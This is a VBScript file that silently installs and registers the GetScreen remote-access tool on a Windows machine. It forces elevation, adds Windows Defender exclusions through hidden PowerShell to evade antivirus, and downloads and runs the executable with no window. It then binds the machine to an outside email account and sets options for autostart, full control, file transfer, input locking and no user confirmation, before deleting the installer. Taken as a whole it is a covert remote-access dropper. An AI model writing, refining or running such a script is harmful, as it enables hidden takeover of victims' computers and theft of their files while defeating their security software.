Option Explicit
' GetScreen EXE - Silent install + register in one VBS
' Official GetScreen download - NO separate hosting needed
Const DOWNLOAD_URL = "https://getscreen.me/download/getscreen.exe"
Const REGISTER_EMAIL = "responder@shabbaduba.co.site"
' CONFIG: Add proxy='socks5://user:pass@host:port' if needed
Const CONFIG_STRING = "name='My Computer' language=en autostart=true nonadmin=true control=true fast_access=false file_transfer=true audio_calls=false lock_input=true disable_confirmation=true auto_wallpaper_hide=true"
Const ADD_AV_EXCLUSION = True   ' Add Windows Defender exclusion to reduce AV purge (needs Admin)
Const SILENT_MODE = True        ' True = no popups, False = debug popups
Const ENABLE_LOG = True         ' Writes log to %TEMP%\getscreen_install.log
Const AV_EXCLUSION_TIMEOUT_SEC = 30  ' Do not block forever if Defender/MpPreference hangs

Dim wshShell, exePath, cmd, objHTTP, objStream, fso, isElevated, exitCode, logPath, logFile
Dim tempPath, psExe

' === Log helper ===
Sub LogWrite(txt)
    If ENABLE_LOG Then
        Dim ts
        Set ts = fso.OpenTextFile(logPath, 8, True)
        ts.WriteLine Now & " | " & txt
        ts.Close
    End If
End Sub

' Escape for PowerShell single-quoted strings (double single-quote)
Function PsEscapeSingleQuoted(p)
    PsEscapeSingleQuoted = Replace(p, "'", "''")
End Function

' Run a command line without waiting forever (fixes hang on Add-MpPreference on some PCs)
Sub RunWithTimeoutSec(cmdLine, timeoutSec, stepName)
    Dim oExec, startTime, timedOut
    timedOut = False
    LogWrite stepName & " (timeout " & timeoutSec & "s)..."
    Set oExec = wshShell.Exec(cmdLine)
    startTime = Now
    Do While oExec.Status = 0
        WScript.Sleep 250
        If DateDiff("s", startTime, Now) >= timeoutSec Then
            LogWrite stepName & " TIMEOUT - stopped waiting; install continues (exclusion may be partial)"
            On Error Resume Next
            oExec.Terminate
            On Error GoTo 0
            timedOut = True
            Exit Do
        End If
    Loop
    If Not timedOut Then
        LogWrite stepName & " finished, exit code=" & oExec.ExitCode
    End If
End Sub

Sub AddDefenderExclusions(pathExe, pathTemp)
    Dim inner, psCmd
    inner = "Add-MpPreference -ExclusionPath '" & PsEscapeSingleQuoted(pathExe) & "' -ErrorAction SilentlyContinue; " & _
            "Add-MpPreference -ExclusionPath '" & PsEscapeSingleQuoted(pathTemp) & "' -ErrorAction SilentlyContinue"
    psCmd = """" & psExe & """ -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & inner & """"
    RunWithTimeoutSec psCmd, AV_EXCLUSION_TIMEOUT_SEC, "Adding AV exclusion"
End Sub

' === Admin elevation ===
isElevated = False
If WScript.Arguments.Count > 0 Then
    isElevated = (LCase(WScript.Arguments(0)) = "elevated")
End If
If Not isElevated Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
    WScript.Quit 0
End If

Set wshShell = CreateObject("WScript.Shell")
tempPath = wshShell.ExpandEnvironmentStrings("%TEMP%")
exePath = tempPath & "\getscreen_install.exe"
logPath = wshShell.ExpandEnvironmentStrings("%TEMP%") & "\getscreen_install.log"
psExe = wshShell.ExpandEnvironmentStrings("%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe")
Set fso = CreateObject("Scripting.FileSystemObject")

If ENABLE_LOG Then
    fso.CreateTextFile(logPath, True).Write ""
    LogWrite "Log file: " & logPath
End If

On Error Resume Next

' === Add AV exclusion (reduces chance of AV purging the exe) ===
If ADD_AV_EXCLUSION Then
    AddDefenderExclusions exePath, tempPath
End If

' === Download EXE ===
LogWrite "Downloading..."
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
If Err.Number <> 0 Then
    LogWrite "FAIL: HTTP object - " & Err.Description
    If Not SILENT_MODE Then MsgBox "HTTP failed: " & Err.Description, vbCritical
    WScript.Quit 1
End If

objHTTP.Open "GET", DOWNLOAD_URL, False
objHTTP.Send

LogWrite "HTTP Status=" & objHTTP.Status
If objHTTP.Status <> 200 Then
    LogWrite "FAIL: Download - Status " & objHTTP.Status
    If Not SILENT_MODE Then MsgBox "Download failed. Status: " & objHTTP.Status, vbCritical
    WScript.Quit 1
End If

Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
objStream.Write objHTTP.ResponseBody
objStream.SaveToFile exePath, 2
objStream.Close
Set objStream = Nothing
Set objHTTP = Nothing

If Not fso.FileExists(exePath) Then
    LogWrite "FAIL: File not saved - AV may have purged it"
    If Not SILENT_MODE Then MsgBox "File not saved. AV may have purged it.", vbCritical
    WScript.Quit 1
End If

LogWrite "Download OK - File size: " & fso.GetFile(exePath).Size & " bytes"

' === Run: getscreen.exe -install -register (official GetScreen cmd - no /s, built-in silent) ===
cmd = """" & exePath & """ -install -register " & REGISTER_EMAIL
LogWrite "Running: " & cmd
exitCode = wshShell.Run(cmd, 0, True)
LogWrite "Install exit code=" & exitCode

' === Apply preset (proxy, etc.) - run installed exe ===
If exitCode = 0 Then
    cmd = """C:\Program Files\Getscreen.me\getscreen.exe"" -config """ & CONFIG_STRING & """"
    LogWrite "Running config: " & Left(cmd, 80) & "..."
    wshShell.Run cmd, 0, True
End If

LogWrite "=== END ==="

' === Cleanup ===
fso.DeleteFile exePath, True
Set fso = Nothing
Set wshShell = Nothing

WScript.Quit exitCode
